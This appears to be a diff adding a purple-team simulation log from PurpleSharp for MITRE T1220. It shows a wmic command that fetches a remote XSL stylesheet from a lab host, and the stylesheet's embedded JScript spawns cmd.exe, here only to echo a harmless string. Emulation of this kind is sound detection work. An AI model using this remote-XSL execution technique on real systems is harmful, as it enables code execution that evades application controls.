@@ -1,0 +1,27 @@
+c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug>PurpleSharp.exe /t T1220
+11/09/2020 18:00:10 [*]  Starting T1220 Simulation on MSEDGEWIN10
+11/09/2020 18:00:10 [*]  Simulator running from c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug\PurpleSharp.exe with PID:6092 as MSEDGEWIN10\IEUser
+11/09/2020 18:00:10 [*]  Executing Command: wmic os get /FORMAT:"http://192.168.114.198:8000/payload.xsl"
+11/09/2020 18:00:10 [*]  Process successfully created. (PID): 6804
+11/09/2020 18:00:10 [*]  Simulation Finished
+11/09/2020 18:00:10 [*]  Playbook Finished
+
+c:\Tools\PurpleSharp-master\PurpleSharp\bin\Debug> os get /FORMAT:"http://192.168.114.198:8000/payload.xsl"MSEDGEWIN10root\cimv2root\cliIMPERSONATEPKTPRIVACYms_411ENABLEOFFN/AOFFOFFSTDOUTSTDOUTN/AON\Device\HarddiskVolume117763Multiprocessor FreeMicrosoft Windows 10 Enterprise Evaluation93281Win32_OperatingSystemWin32_ComputerSystemMSEDGEWIN10540TRUETRUETRUE2FALSEFALSE256220557361441792371384420190319215935.000000+54020201109175541.500000+54020201109180011.075000+5400411Microsoft Corporation4294967295137438953344en-USja-JPMicrosoft Windows 10 Enterprise Evaluation|C:\Windows|\Device\Harddisk0\Partition10134272Microsoft64-bit103325618FALSETRUE100329-20000-00001-AA236001441792OK272\Device\HarddiskVolume1C:\Windows\system32C:5635572419378010.0.17763C:\Windows
+
+'Tapz!'
+
+---
+
+$ cat payload.xsl 
+<?xml version='1.0'?>
+<stylesheet
+  xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
+  xmlns:user="placeholder"
+  version="1.0">
+  <output method="text"/>
+    <ms:script implements-prefix="user" language="JScript">
+      <![CDATA[
+        var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k echo 'Tapz!'");
+      ]]> </ms:script>
+</stylesheet>
+
